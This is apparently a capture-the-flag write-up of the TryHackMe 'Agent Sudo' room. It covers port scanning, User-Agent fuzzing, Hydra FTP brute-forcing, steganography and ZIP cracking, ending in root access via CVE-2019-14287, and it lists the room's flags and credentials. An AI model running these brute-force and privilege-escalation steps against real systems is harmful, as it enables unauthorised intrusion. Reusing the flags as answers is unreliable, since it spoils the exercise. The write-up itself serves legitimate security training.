# 🕵️ TryHackMe CTF Write-up — Agent Sudo

**Web Enumeration | User-Agent Fuzzing | FTP Brute-Force | Steganography | OSINT | CVE-2019-14287**

---

## 🧭 Overview

**Agent Sudo** is a beginner-friendly TryHackMe room that combines several fundamental penetration testing techniques into a single attack chain.

The challenge follows a spy-themed scenario where information is hidden across multiple services and files. Each discovery provides a clue that leads to the next stage of the compromise.

The attack chain covered:

* 🔎 Network reconnaissance
* 🌐 Web enumeration
* 🧩 HTTP User-Agent fuzzing
* 🔐 FTP credential brute-forcing
* 📦 Embedded file extraction
* 🔓 ZIP password cracking
* 🕵️ Steganography
* 🔤 Base64 decoding
* 🔑 SSH authentication
* 🌍 OSINT / reverse image search
* ⬆️ Linux privilege escalation
* 💥 CVE-2019-14287

---

## 🎯 Objective

The objective was to investigate the target, follow the clues left by the fictional agents, obtain initial access, retrieve the user flag, and ultimately escalate privileges to **root**.

---

## 🔎 Reconnaissance — Nmap Port Scan

I started with a full Nmap service and version scan:

```bash id="5yup1m"
nmap -p- -A -Pn -n 10.112.165.171
```

The scan revealed three open TCP ports:

| Port | Service | Version       |
| ---- | ------- | ------------- |
| `21` | FTP     | vsftpd 3.0.3  |
| `22` | SSH     | OpenSSH 7.6p1 |
| `80` | HTTP    | Apache 2.4.29 |

Since no credentials were available for SSH or FTP, and anonymous FTP access was not permitted, the HTTP service became the primary attack surface.


<img width="1600" height="658" alt="image" src="https://github.com/user-attachments/assets/c8082108-cfce-4a28-847a-9f74ef75c8e4" />

---

## 🌐 Web Enumeration

### 📝 Initial Web Page

Navigating to:

```text id="7pyj5g"
http://10.112.165.171/
```

revealed an announcement page containing a message from **Agent R**.

The message instructed agents to use their **codename as the HTTP User-Agent** when accessing the site.


<img width="1600" height="434" alt="image" src="https://github.com/user-attachments/assets/f22692ef-63fd-4552-bdea-da324775825b" />

This suggested that different User-Agent values might expose different content.

Since the agent names appeared to correspond to individual letters, I decided to test the alphabet from `A` to `Z`.

---

## 🧩 User-Agent Fuzzing with Burp Suite

I captured the HTTP request using **Burp Suite** and sent it to **Intruder**.

The `User-Agent` header was selected as the injection point, and a payload containing the letters `A-Z` was configured.

Most requests returned:

```text id="6v1n8p"
HTTP 200
```

However, one response behaved differently.

The User-Agent:

```text id="l7pp8b"
C
```

returned:

```text id="0e5p4s"
HTTP 302
```


<img width="1600" height="448" alt="image" src="https://github.com/user-attachments/assets/9686d247-dd7c-461e-bf0a-ac44d099b015" />

Inspecting the response headers revealed:

```http id="7xj3ce"
Location: agent_C_attention.php
```


<img width="301" height="144" alt="image" src="https://github.com/user-attachments/assets/2310f2e7-6c6a-4942-a4d0-fc45ada5eca6" />

This provided the next step in the attack chain.

---

## 🕵️ Agent C — Username Discovery

I navigated to:

```text id="u5w5j7"
http://10.112.165.171/agent_C_attention.php
```

while using:

```http id="3l5u4w"
User-Agent: C
```

The page contained a private message from Agent R addressed to Agent C.

The message revealed that Agent C's real name was:

```text id="rv9u7u"
chris
```

It also contained a warning about **Agent J having a weak password**.


<img width="1600" height="430" alt="image" src="https://github.com/user-attachments/assets/5e9e993e-5da5-4bfe-908c-e6e36dec052f" />

At this point, I had a valid username and a strong indication that FTP would be relevant to the next stage.

---

## 🔐 FTP Brute-Force with Hydra

Using the discovered username `chris`, I performed a password attack against the FTP service using **Hydra** and the `rockyou.txt` wordlist:

```bash id="dfg6qg"
hydra -l chris \
-P /usr/share/wordlists/rockyou.txt \
ftp://10.112.165.171
```

Hydra successfully recovered the password:

| Service | Username | Password  |
| ------- | -------- | --------- |
| FTP     | `chris`  | `crystal` |


<img width="1600" height="298" alt="image" src="https://github.com/user-attachments/assets/6176d03a-2d9b-418b-9364-e59bc8244f5a" />

---

## 📂 FTP Enumeration

I connected to the FTP service using the recovered credentials:

```bash id="cy6ax9"
ftp 10.112.165.171
```

After authentication, three files were found:

```text id="xygr5f"
To_agentJ.txt
cute-alien.jpg
cutie.png
```

The files were downloaded using:

```ftp id="qv5f8f"
mget *
```


<img width="1600" height="649" alt="image" src="https://github.com/user-attachments/assets/63a0557d-c291-4473-9f98-1240620f0b38" />

---

## 📝 Reading `To_agentJ.txt`

The first file I inspected was:

```text id="c0q5mb"
To_agentJ.txt
```

The message from Agent C revealed an important clue.

The alien-themed images were described as **fake**, while the real picture was supposedly located in Agent J's directory.

More importantly, the message indicated that **Agent J's password was hidden inside one of the images**.

This suggested that the next step would involve steganography and file analysis.

---

## 📦 Steganography — PNG Analysis with Binwalk

I started by analyzing `cutie.png` using **Binwalk**:

```bash id="2h4azn"
binwalk cutie.png
```

Binwalk detected embedded data, including a ZIP archive beginning at byte offset:

```text id="d40zh1"
34562
```

The archive contained:

```text id="c0b5lv"
To_agentR.txt
```

However, the archive was password protected.



Since automatic extraction was unsuccessful, I manually carved the archive from the PNG using `dd`:

```bash id="x0m2cy"
dd if=cutie.png of=hidden.zip bs=1 skip=34562
```

This produced:

```text id="7w1jtb"
hidden.zip
```

---

## 🔓 Cracking the ZIP with John the Ripper

The ZIP archive was password protected.

I first converted the ZIP password hash into a format compatible with John the Ripper:

```bash id="y4b3sj"
zip2john hidden.zip > john
```

Then I used `rockyou.txt` to crack the password:

```bash id="2jgf8h"
john john --wordlist=/usr/share/wordlists/rockyou.txt
```

The password was recovered:

```text id="wz2b8r"
alien
```

![John the Ripper](IMAGE_URL)

*Figure 9 — ZIP password successfully cracked as `alien`.*

The archive contained:

```text id="apbyy8"
To_agentR.txt
```

---

## 🔤 Base64 Decoding

After extracting `To_agentR.txt`, I found the following Base64-encoded string:

```text id="h5rj1w"
QXJlYTUx
```

I decoded it using:

```bash id="jvl1h0"
echo QXJlYTUx | base64 -d
```

The output was:

```text id="tq7yqf"
Area51
```

![Base64 decoding](IMAGE_URL)

*Figure 10 — Base64 string decoded to `Area51`.*

`Area51` appeared to be a passphrase rather than simply a location, suggesting that it could be used to extract hidden information from another file.

---

## 🖼️ Steganography — Extracting Data from `cute-alien.jpg`

I used **steghide** against the JPEG file:

```bash id="7l0vib"
steghide --extract -sf cute-alien.jpg
```

When prompted for the passphrase, I entered:

```text id="99mtpf"
Area51
```

The extraction succeeded and produced:

```text id="5g0dny"
message.txt
```

Reading the file revealed Agent J's credentials:

```text
Recipient: james (Agent J)
Password: hackerrules!
```


<img width="1087" height="418" alt="image" src="https://github.com/user-attachments/assets/b3ba71c9-09dc-478a-8ca3-fa52d898dbea" />

---

## 🔑 SSH Access as James

With the recovered credentials:

```text id="5u3o8r"
Username: james
Password: hackerrules!
```

I connected to SSH:

```bash id="y9l5i4"
ssh james@10.112.165.171
```

The login was successful.

The home directory contained:

```text id="h9r5x7"
Alien_autospy.jpg
user_flag.txt
```

I read the user flag:

```bash id="5pqgib"
cat user_flag.txt
```

### 🚩 User Flag

```text id="h7x7mb"
b03d975e8c92a7c04146cfa7a5a313c7
```


<img width="1600" height="643" alt="image" src="https://github.com/user-attachments/assets/db6bb189-6464-489c-a974-83e3c298d373" />

---

## 🌍 OSINT — Identifying the Alien Autopsy Image

The file:

```text id="q2e4ki"
Alien_autospy.jpg
```

turned out to be the famous **1995 alien autopsy footage still**, associated with the alleged 1947 Roswell incident.

A reverse image search using **Google Lens** confirmed the identity of the image.


<img width="1600" height="730" alt="image" src="https://github.com/user-attachments/assets/494a0666-1215-4c64-9d45-2098adae75c2" />


<img width="1600" height="841" alt="image" src="https://github.com/user-attachments/assets/fa989d75-8ba5-4c44-b840-d45fc1457f92" />

This stage was primarily an OSINT exercise and helped complete one of the room's clues.

---

## ⬆️ Privilege Escalation

### 🔎 Kernel & Sudo Version Enumeration

With an SSH foothold as `james`, I started looking for a privilege escalation path.

I checked the system information:

```bash id="hjz3fi"
uname -a
```

The target was running:

```text id="6p4pws"
Linux agent-sudo
4.15.0-55-generic
```
<img width="1600" height="715" alt="image" src="https://github.com/user-attachments/assets/84b2a9ed-54ca-4bcd-bcfb-468030c42c5c" />


I then investigated the installed sudo version.

The system was vulnerable to:

**CVE-2019-14287**

This vulnerability affects certain older versions of `sudo` and can allow a user with specific sudo permissions to bypass restrictions by specifying a special user ID value.
<img width="1600" height="839" alt="image" src="https://github.com/user-attachments/assets/7cde745c-bb9c-420e-a9bc-a2ed2fb88cb8" />

---

## 💥 CVE-2019-14287 Exploitation

A proof-of-concept exploit for **CVE-2019-14287** was used from a GitHub repository.

The exploit was transferred to the target and made executable:

```bash id="w0m7pq"
chmod +x sudo-exploit.sh
```

It was then executed:

```bash id="r4o4on"
./sudo-exploit.sh
```

The exploit successfully spawned a root shell.


I verified the resulting privileges:

```bash id="byc5vz"
id
```

The result confirmed:

```text id="bb0d5w"
uid=0(root) gid=1000(james) groups=1000(james)
```

---

## 👑 Root Flag

With root privileges, I searched for the root flag:

```bash id="p7m1p8"
find / -name root.txt 2>/dev/null
```

The flag was located at:

```text id="gjw8m1"
/root/root.txt
```

I retrieved it with:

```bash id="6s5t5f"
cat /root/root.txt
```

### 🚩 Root Flag

```text id="6r6e4d"
b53a02f55b57d4439e3341834d70c062
```


<img width="1600" height="748" alt="image" src="https://github.com/user-attachments/assets/804764a1-fba2-4c4d-90a6-01614d840208" />

---

## 🚩 Flags & Important Credentials

| Item                | Value                              |
| ------------------- | ---------------------------------- |
| 👤 User Flag        | `b03d975e8c92a7c04146cfa7a5a313c7` |
| 👑 Root Flag        | `b53a02f55b57d4439e3341834d70c062` |
| FTP Username        | `chris`                            |
| FTP Password        | `crystal`                          |
| ZIP Password        | `alien`                            |
| Steghide Passphrase | `Area51`                           |
| SSH Username        | `james`                            |
| SSH Password        | `hackerrules!`                     |
| CVE                 | `CVE-2019-14287`                   |
| Alien Photo         | 1995 Roswell alien autopsy hoax    |

---

## 🛠️ Tools & Techniques

| Tool / Technique        | Purpose                        |
| ----------------------- | ------------------------------ |
| **Nmap**                | Port and service enumeration   |
| **Burp Suite Intruder** | User-Agent fuzzing             |
| **Hydra**               | FTP password brute-force       |
| **Binwalk**             | Detecting embedded data        |
| **dd**                  | Manual binary carving          |
| **zip2john**            | Extracting ZIP password hashes |
| **John the Ripper**     | ZIP password cracking          |
| **steghide**            | JPEG steganography extraction  |
| **Base64**              | Decoding encoded data          |
| **SSH**                 | Remote authentication          |
| **Google Lens**         | Reverse image search / OSINT   |
| **CVE-2019-14287**      | Sudo privilege escalation      |

---

## 🧠 Key Takeaways

### 1. Test Non-Standard HTTP Headers

The `User-Agent` header is normally used for client identification, but applications can also use it as an access-control mechanism.

Testing unusual or custom header values can reveal hidden functionality.

### 2. Weak Passwords Can Chain Multiple Attacks

The password:

```text
crystal
```

provided FTP access, while another weak credential ultimately enabled SSH access.

Dictionary attacks remain effective against poorly chosen passwords.

### 3. Steganography Can Hide Multiple Layers of Information

This room demonstrated several different forms of hidden data:

```text
cutie.png
   ↓
Embedded ZIP
   ↓
To_agentR.txt
   ↓
Base64
   ↓
Area51
   ↓
cute-alien.jpg
   ↓
Steghide
   ↓
James's credentials
```

The important lesson is to investigate suspicious files beyond their visible content.

### 4. Encoded Data Is Not Encrypted Data

The string:

```text
QXJlYTUx
```

looked suspicious, but it was simply Base64 encoded.

Encoding provides no confidentiality and can be reversed easily.

### 5. OSINT Can Become Part of a Technical Attack Chain

The alien image investigation demonstrated how publicly available information can provide context and clues during a penetration test or CTF.

### 6. Outdated Sudo Versions Are Dangerous

**CVE-2019-14287** demonstrates how an outdated privileged utility can provide a direct path to root when the vulnerable conditions are present.

Keeping system packages patched is an essential part of privilege escalation prevention.

### 7. Follow the Clues

This room is a good example of **layered enumeration**.

Each discovery led to the next:

```text
Web Message
   ↓
User-Agent C
   ↓
Chris
   ↓
FTP Password
   ↓
PNG Archive
   ↓
ZIP Password
   ↓
Base64
   ↓
Area51
   ↓
JPEG Steganography
   ↓
James Credentials
   ↓
SSH
   ↓
CVE-2019-14287
   ↓
root 👑
```

---

## 🏁 Conclusion

The **Agent Sudo** room demonstrated how seemingly unrelated techniques can be combined into a complete compromise chain.

The assessment began with basic network enumeration and web reconnaissance. Fuzzing the `User-Agent` header revealed a hidden endpoint, which exposed a username that enabled an FTP brute-force attack.

The FTP files contained additional hidden data, leading through **Binwalk, ZIP cracking, Base64 decoding, and steganography** to recover James's SSH credentials.

Finally, enumeration of the target system revealed a vulnerable version of `sudo`, allowing exploitation of **CVE-2019-14287** and successful escalation to root.

The complete attack chain was:

> **Recon → Web Enumeration → User-Agent Fuzzing → FTP Brute-Force → File Analysis → Steganography → SSH → Sudo Exploitation → Root 👑**
